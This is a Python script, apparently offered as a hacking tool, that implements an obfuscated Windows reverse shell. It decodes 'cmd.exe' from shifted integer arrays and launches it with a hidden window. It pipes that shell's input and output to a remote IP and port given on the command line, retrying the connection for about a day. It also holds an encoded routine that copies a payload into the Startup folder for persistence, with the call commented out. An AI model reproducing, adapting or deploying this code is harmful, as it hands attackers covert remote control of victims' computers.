# encoding: UTF-8
#######     by 5ynt@x3rr0r
import os
import platform
import socket
import subprocess
import sys
import threading
import time
import shutil

La=[1828,1838,1829,1775,1830,1849,1830]#cmd.exe
#La=[1838,1828,1829,1775,1830,1849,1830]#mcd.exe
#La=[1838,1828,1829,1775,1829,1837,1837]#mcd.dll
T1=[111,222,333,444,555]
T2=[222,226,157,223,208,227,215,157,212,231,223,208,221,211,228,226,212,225,151,145,237,145,152]
T3=[158,176,223,223,179,208,227,208,158,193,222,208,220,216,221,214,158,188,216,210,225,222,226,222,213,227]
T4=[158,198,216,221,211,222,230,226,158,194,227,208,225,227,143,188,212,221,228]
T5=[158,191,225,222,214,225,208,220,226,158,194,227,208,225,227,228,223,158]
T7=[222,226,157,214,212,227,210,230,211,151,152]
T8=[198,216,221,162,161,212,210,214,157,223,232,230]
T9=[555,666]
T6=T3+T4+T5


osn = platform.system()
ttd=(threading.Thread)
sk=(socket)
nw =(subprocess.CREATE_NO_WINDOW)
sp= int(subprocess.PIPE)
prot=443

try:
    ipadd = (sys.argv[1])
except:
    ipadd = "127.0.0.1"
try:
    port = int(sys.argv[2])
except:
    port = 1234
ec= prot 
def ssos(bdcon, tt): 
    while True:
        output=tt.stdout.read1()
        try:
            bdcon.send(output)
        except Exception as e:
            bdcon.close()
            os._exit(0)
    
ec =(ec-243)
def sses(bdcon, tt):
     
     while True:
        output=tt.stderr.read1()
        try:
            bdcon.send(output)
        except Exception as e:
            bdcon.close()
            os._exit(0)
def fstrun():
    Ec=T1[1];Ec=int(Ec/2)
    paht=(''.join(chr(i-(Ec)) for i in T2));udir =eval(paht)
    pth = (''.join(chr(i-(Ec)) for i in T6));usud=(udir+pth)
    cwdc=(''.join(chr(i-(Ec)) for i in T7));cwd=eval(cwdc)
    bds=(''.join(chr(i-(Ec)) for i in T8))
    if os.path.isfile(usud+bds):
        print()
    else:
        shutil.copy(f'{cwd}/{bds}',  f'{usud}{bds}')


#fstrun()
EEc = sum (T1)
ec=(ec*9)
mcd = (''.join(chr(i-(EEc + 64)) for i in La))
sppo =(subprocess.Popen)
ssm=(socket.SOCK_STREAM)


def stt():
    st.daemon = True
    st.start()

def ssis(bdcon, tt):
    while True:
        try:
            data = bdcon.recv(1024)
            if len(data) > 0:
                tt.stdin.write(data)
                tt.stdin.flush()
       
        except Exception as e:
                bdcon.close()
                os._exit(0)

tt = sppo(mcd,creationflags=nw, stdin=sp, stdout=sp, stderr=sp)

bdcon = sk.socket(sk.AF_INET, ssm)

for w in range(8640):
    try:
        bdcon.connect((ipadd, port))
    except Exception as e:
        time.sleep(10)
    else:
        if osn == "Windows":
            st = ttd(target=ssos, args=[bdcon, tt]);stt()
            st = ttd(target=sses, args=[bdcon, tt]);stt()
            st = ttd(target=ssis, args=[bdcon, tt]);stt()

while True:
    time.sleep(1)
